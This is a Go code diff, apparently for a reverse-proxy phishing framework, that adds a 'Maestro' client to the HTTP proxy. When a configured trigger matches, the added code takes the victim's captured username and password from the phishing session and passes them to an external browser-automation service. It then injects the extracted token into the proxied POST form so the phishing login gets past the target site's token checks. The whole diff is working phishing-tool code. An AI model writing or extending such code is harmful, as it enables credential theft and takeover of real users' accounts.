@@ -71,6 +71,7 @@ type HttpProxy struct {
 	db                *database.Database
 	bl                *Blacklist
 	gophish           *GoPhish
+	maestro_client    *MaestroClient
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -118,6 +119,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		db:                db,
 		bl:                bl,
 		gophish:           NewGoPhish(),
+		maestro_client:    nil, // Initialized later if needed
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -849,6 +851,70 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								for k, v := range req.PostForm {
 									if len(v) > 0 {
 										log.Debug("POST %s = %s", k, v[0])
+									}
+								}
+
+								// Maestro token extraction
+								if pl.HasMaestro() && p.cfg.GetMaestroEnabled() {
+									trigger := pl.GetMaestroTrigger(req.Host, req.URL.Path)
+									if trigger != nil {
+										interceptor := pl.GetMaestroInterceptor(trigger.token)
+										if interceptor != nil {
+											// Get session credentials
+											p.session_mtx.Lock()
+											session, session_ok := p.sessions[ps.SessionId]
+											p.session_mtx.Unlock()
+
+											if session_ok && session.Username != "" && session.Password != "" {
+												log.Info("[%d] Maestro: extracting token for %s%s", ps.Index, req.Host, req.URL.Path)
+
+												// Initialize Maestro client if needed
+												if p.maestro_client == nil {
+													endpoint := p.cfg.GetMaestroEndpoint()
+													p.maestro_client = NewMaestroClient(endpoint)
+
+													// Health check
+													if err := p.maestro_client.HealthCheck(); err != nil {
+														log.Warning("Maestro health check failed: %v", err)
+														p.maestro_client = nil
+													}
+												}
+
+												if p.maestro_client != nil {
+													// Start browser session
+													maestroSessionID := ps.SessionId
+													if err := p.maestro_client.StartSession(maestroSessionID); err != nil {
+														log.Error("Maestro session start failed: %v", err)
+													} else {
+														// Extract token
+														token, err := p.maestro_client.ExtractToken(
+															maestroSessionID,
+															trigger,
+															interceptor,
+															session.Username,
+															session.Password,
+														)
+
+														if err != nil {
+															log.Error("Maestro token extraction failed: %v", err)
+														} else {
+															// Replace token in POST form
+															req.PostForm.Set(trigger.token, token)
+															log.Success("[%d] Maestro: token replaced in POST form", ps.Index)
+														}
+
+														// Close session (async, don't wait)
+														go func() {
+															if err := p.maestro_client.CloseSession(maestroSessionID); err != nil {
+																log.Debug("Maestro session close warning: %v", err)
+															}
+														}()
+													}
+												}
+											} else {
+												log.Debug("Maestro: skipping token extraction (credentials not captured yet)")
+											}
+										}
 									}
 								}
 
